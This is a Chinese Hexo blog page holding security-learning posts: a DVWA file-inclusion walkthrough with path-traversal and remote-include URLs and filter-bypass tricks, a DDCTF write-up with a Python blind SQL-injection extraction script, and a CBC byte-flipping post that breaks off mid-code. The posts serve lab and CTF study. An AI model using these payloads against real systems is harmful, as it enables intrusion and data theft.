<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg">
  
  
  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Mr1.Grim</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">所有文章</a></li>
                        
                            <li><a  href="/categories/开发工具/">玩转开发工具</a></li>
                        
                            <li><a  href="/categories/digital">玩转数码</a></li>
                        
                            <li><a  href="/categories/algorithm">算法学习</a></li>
                        
                            <li><a  href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
                            
                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mr1.Grim</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="http://p1vrkwaxt.bkt.clouddn.com/mouse.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Mr1.Grim</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/categories/开发工具/">玩转开发工具</a></li>
                
                    <li><a href="/categories/digital">玩转数码</a></li>
                
                    <li><a href="/categories/algorithm">算法学习</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-DVWA之File Inclusion" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/DVWA之File Inclusion/" class="article-date">
      <time datetime="2018-07-06T05:24:35.539Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/DVWA之File Inclusion/">DVWA之File Inclusion</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>参考链接:<a href="http://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/119150.html</a></p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞是”代码注入”的一种。”代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。”代码注入”的典型代表就是文件包含(File Inclusion)。文件包含可能会出现在JSP,PHP,ASP等语言中。<br><br>在PHP中主要有四个函数:<br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</span><br><span class="line"></span><br><span class="line">require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</span><br><span class="line"></span><br><span class="line">include_once()和require_once()：若文件中代码已被包含则不会再次包含</span><br></pre></td></tr></table></figure>
<p>文件包含漏洞又分为两部分:本地文件包含和远程文件包含</p>
<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>服务端核心代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file=$_GET[&apos;page&apos;];</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
<p>需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion,简称LFI)</span><br></pre></td></tr></table></figure>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/DGYZK%60Y1%252H%5BW_UQ%60M0R87H.png" alt="image"></p>
<ul>
<li>随意构造?page=2333333,发现错误报告（开了错误提示为前提)<br><img src="http://p1vrkwaxt.bkt.clouddn.com/R3IQE%6090WIU$%7DWI4Y4JA6W0.png" alt="image"><br>虽然Windows不能直接获取文件，但是给出的错误信息中爆出了绝对路径D:\appserv\www\DVWA-master\<br><br>构造url(绝对路径)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=D:\appserv\www\DVWA-master\php.ini</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>得到php.ini的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On</span><br></pre></td></tr></table></figure></p>
<p>构造url(相对路径)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../../../appserv/www/DVWA-master/php.ini</span><br></pre></td></tr></table></figure></p>
<p>这里加多次../是为了可以保证回到根目录</p>
<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
<p>这里需要一个服务器(我这里不放出真正的ip)<br><br>在远程服务器xxx.xxx.x.xx上传一个1.php文件，内容为hello.<br><br>构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=http://xxx.xxx.x.xx/1.php</span><br></pre></td></tr></table></figure></p>
<p>可以看到页面输出hello</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务端核心代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看出同样是str_repalce函数。可以采用双写绕过替换规则<br></p>
<ul>
<li>第一个的http://与https://主要针对远程服务器的，可采用如下格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://xxx.xxx.x.xx/1.php</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>str_replace函数会将http://替换成空白，从而成功执行远程命令</p>
<ul>
<li>第二的../与../也同样可以用双写规则绕过，不过对绝对路径的方式包含文件没有影响<br></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././appserv/www/DVWA/php.ini</span><br></pre></td></tr></table></figure>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B1UPIDGVT0%7BHQ%7D_~%29R3%28LTV.png" alt="image"><br>成功爆出php.ini的信息</p>
<h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>服务端核心代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File Inclusion Source</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&apos;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>High级别使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
<p>High级别的代码规定只能包含file开头的文件，不过我们依然可以利用file协议绕过</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/6W_FPG3~1N$%2963V$03%7D%7BSOB.png" alt="image"></p>
<p>成功读取服务器的配置文件</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">// The page we wish to display  </span><br><span class="line">$file = $_GET[ &apos;page&apos; ];  </span><br><span class="line">  </span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php  </span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;  </span><br><span class="line">    // This isn&apos;t the page we want!  </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;  </span><br><span class="line">    exit;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-DDCTF部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/DDCTF部分wp/" class="article-date">
      <time datetime="2018-07-06T05:24:35.539Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/DDCTF部分wp/">DDCTF部分wp</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>抱着学习的态度去打DDCTF,在朋友们帮助下收获很多，这里先感谢朋友</p>
<h2 id="Web-数据库的秘密"><a href="#Web-数据库的秘密" class="headerlink" title="Web 数据库的秘密"></a>Web 数据库的秘密</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5D%60Z4%292YP67K$D%7B~LSR_%25LJG.png" alt="image"></p>
<p>这一步比较简单，抓包在消息头headers构造:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.232.23.245</span><br></pre></td></tr></table></figure></p>
<p>第二步如图，这里有几个注意点<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%256Z@%7BQ%7DD%60%5DNG3@0W4BWZ%5BS3.png" alt="image"></p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/83S0QKICR%7D26F~B1N%7B%7BZ%7BNU.png" alt="image"></p>
<ul>
<li>第一，这里的time是时间戳，抓包后一段时间后会失效，与sig同步</li>
<li>第二，sig采用了math.js中的sha1算法，每一步骤有不同的校验值(第二关查看源代码)</li>
<li>第三,每一次运行都要提交 X-Forwarded-For: 123.232.23.245,否则回到原点</li>
</ul>
<p>下面讲讲具体操作，不放图了，因为抓包频繁贼麻烦</p>
<ul>
<li>复制main.js,math.js,index.php在本地搭建，保证有与time(时间戳)同步的sig校验值</li>
<li>下面放出生成sig的php文件（太长，就是math.js文件+如下(main.js修改)）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	function signGenerate(obj, key) &#123;</span><br><span class="line">	var str0 = &apos;&apos;;</span><br><span class="line">	for (i in obj) &#123;</span><br><span class="line">		if (i != &apos;sign&apos;) &#123;</span><br><span class="line">			str1 = &apos;&apos;;</span><br><span class="line">			str1 = i + &apos;=&apos; + obj[i];</span><br><span class="line">			str0 += str1</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 return hex_math_enc(str0 + key)</span><br><span class="line">&#125;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	id: &apos;&apos;,</span><br><span class="line">	title: &apos;&apos;,</span><br><span class="line">	author: &apos;admin\&apos; and 1#&apos;, //no可以返回数据</span><br><span class="line">	//author: &apos;admin\&apos; and 0#&apos;, //不返回数据	</span><br><span class="line">	time: &apos;1524147898&apos;  //改这里的time</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	var key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>每一次抓包的时候记得把抓到的time值传给php生成sig后，再复制sig值传给抓包.</p>
<p>最后测试注入点在author上，语句如下:<br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">author: &apos;admin\&apos; and 1#&apos;, //可以返回数据</span><br><span class="line">author: &apos;admin\&apos; and 0#&apos;, //不返回数据</span><br></pre></td></tr></table></figure>
<p>多次操作后，发现&gt;，union等等过滤了，if可以用，写个脚本.(这里是python,一个学长大佬用的是js在控制台也得到flag，在下不会js学不来学不来)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">def sig(obj,key):</span><br><span class="line">	str0 = &apos;&apos;</span><br><span class="line">	for i in  obj:</span><br><span class="line">		str1=&apos;&apos;</span><br><span class="line">		str1=i+&apos;=&apos;+obj[i]</span><br><span class="line">		str0+=str1 </span><br><span class="line">	string =  str0+key</span><br><span class="line">	sha1 = hashlib.sha1()</span><br><span class="line">	sha1.update(string.encode(&apos;utf-8&apos;))</span><br><span class="line">	res = sha1.hexdigest()</span><br><span class="line">	return  res</span><br><span class="line"></span><br><span class="line">sign=&apos;&apos;</span><br><span class="line">def urll(sign,now,payload):</span><br><span class="line">	url = &apos;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=%s&amp;time=%s&apos;%(sign,now)</span><br><span class="line">	headers=&#123;</span><br><span class="line">		&apos;X-Forwarded-For&apos;: &apos;123.232.23.245&apos;</span><br><span class="line">	&#125;</span><br><span class="line">	data=&#123;</span><br><span class="line">		&apos;id&apos;:&apos;&apos;,</span><br><span class="line">		&apos;title&apos;:&apos;&apos;,</span><br><span class="line">		&apos;date&apos;:&apos;&apos;,</span><br><span class="line">		&apos;author&apos;: payload,</span><br><span class="line">		&apos;button&apos;:&apos;search&apos;</span><br><span class="line">	&#125;</span><br><span class="line">	r1 = requests.post(url,headers=headers,data=data)</span><br><span class="line">	return r1.text</span><br><span class="line">key = &quot;adrefkfweodfsdpiru&quot;</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for x in range(1,50):</span><br><span class="line">	asc = 33</span><br><span class="line">	while 1:</span><br><span class="line">		now = int(time.time())</span><br><span class="line">		#payload=&apos;admin\&apos; and if(((select  greatest(ascii(substr((select  group_concat(schema_NAME) from information_schema.schemata),%s,1)),1)) like %s),1,0)#&apos;%(str(x),str(asc)) #information_schema,ddctf</span><br><span class="line">		#payload=&apos;admin\&apos; and if(((select  greatest(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema like  (select 0x6464637466)),%s,1)),1)) like %s),1,0)#&apos;%(str(x),str(asc)) </span><br><span class="line">		#payload=&apos;admin\&apos; and if(((select  greatest(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name like  (select 0x6d657373616765)),%s,1)),1)) like %s),1,0)#&apos;%(str(x),str(asc)) </span><br><span class="line">		payload=&apos;admin\&apos; and if(((select  greatest(ascii(substr((select  group_concat(secvalue) from  ctf_key3),%s,1)),1)) like %s),1,0)#&apos;%(str(x),str(asc)) </span><br><span class="line">		obj =  &#123;&apos;id&apos;:&apos;&apos;,&apos;title&apos;:&apos;&apos;,&apos;author&apos;:&apos;&apos;+payload+&apos;&apos;,&apos;date&apos;:&apos;&apos;,&apos;time&apos;:&apos;&apos;+str(now)+&apos;&apos;&#125;</span><br><span class="line">		sign = sig(obj,key)</span><br><span class="line">		content = urll(sign,now,payload)</span><br><span class="line">		//如果返回2017-12-04，则说明ascii码猜测正确！！</span><br><span class="line">		if &apos;2017-12-04&apos; in content:</span><br><span class="line">			flag+=chr(asc)</span><br><span class="line">			print(flag)</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			asc=asc+1</span><br><span class="line">		if asc==255:</span><br><span class="line">			print(&quot;fail&quot;)</span><br><span class="line">			break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-CBC字节翻转攻击" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/07/06/CBC字节翻转攻击/" class="article-date">
      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2018/07/06/CBC字节翻转攻击/">CBC字节翻转攻击</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p>参考链接: <a href="https://rhythmmark.github.io//bugku-web-login4-WP/" target="_blank" rel="noopener">https://rhythmmark.github.io//bugku-web-login4-WP/</a> 这个贼详细<br><br><a href="https://www.cnblogs.com/s1ye/p/9021202.html" target="_blank" rel="noopener">https://www.cnblogs.com/s1ye/p/9021202.html</a></p>
<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;sqlwaf.php&apos;;</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;................&quot;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $iv; </span><br><span class="line">    // 随机生成从1到255中的一个数字并且将它进行ascii编码，重复16次，将它们合在一起为$vi,返回$vi</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv=get_random_iv();            #初始向量</span><br><span class="line">    $plain = serialize($info);      #info序列化后得到明文</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);  #CBC模式下AES的加密明文</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, 